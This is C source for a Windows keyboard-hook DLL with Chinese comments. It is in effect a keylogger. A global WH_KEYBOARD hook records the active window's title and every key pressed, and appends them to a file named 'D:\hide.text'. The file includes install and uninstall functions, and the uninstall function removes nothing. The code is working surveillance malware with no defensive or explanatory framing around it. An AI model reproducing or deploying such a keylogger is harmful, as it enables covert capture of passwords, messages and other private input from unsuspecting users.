#define _CRT_SECURE_NO_WARNINGS

#include"KeyHook.h"
LRESULT CALLBACK hookProc(int code, WPARAM wParam, LPARAM lParam)
{
	//MessageBox(NULL, L"有人按键了", L"提示", NULL);
	HWND hWnd = GetActiveWindow();
	if (NULL == hWnd)//获取活动窗口失败
	{
		hWnd = GetForegroundWindow();
		if (NULL == hWnd)//获取顶层窗口失败
		{
			//本次按键消息不处理
			return CallNextHookEx(hHook, code, wParam, lParam);
		}
	}
	//获取窗口标题
	char windowText[256] = { 0 };
	GetWindowTextA(hWnd, windowText, 255);
	//MessageBox(NULL, windowText, "窗口标题", NULL);

	if((code<0) | (code == HC_NOREMOVE))
		return CallNextHookEx(hHook, code, wParam, lParam);
	if (lParam & 0x40000000)
		return CallNextHookEx(hHook, code, wParam, lParam);
	//获取按键文本
	char keyText[256] = { 0 };
	GetKeyNameText(lParam, keyText, 255);
	//MessageBox(NULL, keyText, "按键文本", NULL);

	//写到文件中
	char textForWrite[256] = { 0 };
	sprintf(textForWrite, "%s:%s\n", windowText, keyText);
	FILE* fp = fopen("D:\\hide.text", "a");
	if(NULL == fp)return CallNextHookEx(hHook, code, wParam, lParam);
	fwrite(textForWrite, 1, strlen(textForWrite), fp);
	fclose(fp);

	return CallNextHookEx(hHook,code,wParam,lParam);
}

bool installHook()//安装钩子
{
	//MessageBox(NULL, "安装钩子", "提示", NULL);
	hHook = SetWindowsHookEx(WH_KEYBOARD, hookProc, GetModuleHandle("KeyHook"),NULL);
	if (NULL == hHook)
	{
		//MessageBox(NULL, "安装钩子失败", "提示", NULL);
		return false;
	}
	//MessageBox(NULL, "安装钩子成功", "提示", NULL);
	return true;
}

bool uninstallHook()//卸载钩子
{
	//MessageBox(NULL, "卸载钩子", "提示", NULL);
	return true;
}

